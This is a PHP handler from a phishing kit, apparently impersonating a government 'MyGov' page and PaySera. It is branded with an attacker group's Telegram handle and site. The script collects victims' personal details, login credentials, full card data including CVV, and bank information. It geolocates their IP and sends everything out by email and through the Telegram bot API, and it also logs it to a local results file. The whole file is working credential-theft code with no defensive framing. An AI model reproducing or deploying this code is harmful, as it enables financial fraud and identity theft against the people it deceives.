<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀⠀t.me/McSl0vv⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀  McSl0vv.com⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
session_start();
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$send2 = $email2;
$message = "[link: $link ]\r\n";

$_SESSION['firstname'] = $_POST['firstname'];
$_SESSION['lastname'] = $_POST['lastname'];
$_SESSION['address1'] = $_POST['address1'];
$_SESSION['address2'] = $_POST['address2'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['zipcode'] = $_POST['zipcode'];
$_SESSION['phonee'] = $_POST['phonee'];
$_SESSION['birthday'] = $_POST['birthday'];

$file = fopen("Mygov_Rzlt.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$hostname = gethostbyaddr($ip);
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "🇩🇿🇩🇿 PaySera 🇩🇿🇩🇿 $ip";
$headers = "From: McSl0vv-Team<info@McSl0vvTeam.com>";
$send = $email; 


$message = "------------ DARKWEBDEITY MYGOV PAGE-------------\r\n";
$message .= "[+]━━━━【🔑 Account Login 】━━━━[+]\r\n";
$message .= "|Email or Phone      : ".$_SESSION['username']."\r\n";
$message .= "|Password      : ".$_SESSION['password']."\r\n";
$message .= "[+]━━━━【💳 CC INFO】━━━━[+]\r\n";
$message .= "|Card holder      : ".$_SESSION['holder']."\r\n";
$message .= "|[💳 CC Number]      : ".$_SESSION['cardnumber']."\r\n";
$message .= "|[🔄 Expiry Date ]      : ".$_SESSION['expiry']."\r\n";
$message .= "|[🔑 (CVV)]      : ".$_SESSION['cvv']."\r\n";
$message .= "[+]━━━━【🏦 Bank INFO】━━━━[+]\r\n";
$message .= "|Bank Name          : ".$_SESSION['bank_name']."\r\n";
$message .= "|Card Type           : ".$_SESSION['bank_type']."\r\n";
$message .= "|Card Brand          : ".$_SESSION['bank_brand']."\r\n";
$message .= "|Card Country           : ".$_SESSION['bank_country']."\r\n";
$message .= "|Bank Scheme          : ".$_SESSION['bank_scheme']."\r\n";
$message .= "[+]━━━━【[📓] Billing INFO】━━━━[+]\r\n";
$message .= "|First name          : ".$_SESSION['firstname']."\r\n";
$message .= "|Last name          : ".$_SESSION['lastname']."\r\n";
$message .= "|Address 1 [📓]          : ".$_SESSION['address1']."\r\n";
$message .= "|Address 2 [📓]          : ".$_SESSION['address2']."\r\n";
$message .= "|City 🌃           : ".$_SESSION['city']."\r\n";
$message .= "|State 🌃           : ".$_SESSION['state']."\r\n";
$message .= "|Zip code 🌃          : ".$_SESSION['zipcode']."\r\n";
$message .= "|Phone number 📞           : ".$_SESSION['phonee']."\r\n";
$message .= "|Date of birthday 🎂        : ".$_SESSION['birthday']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "IP  :  ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "-----------DWD-------------\n";
$_SESSION['messag'] = $message;
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$myfile = fopen("Mygov_Rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../loading.php");


?>

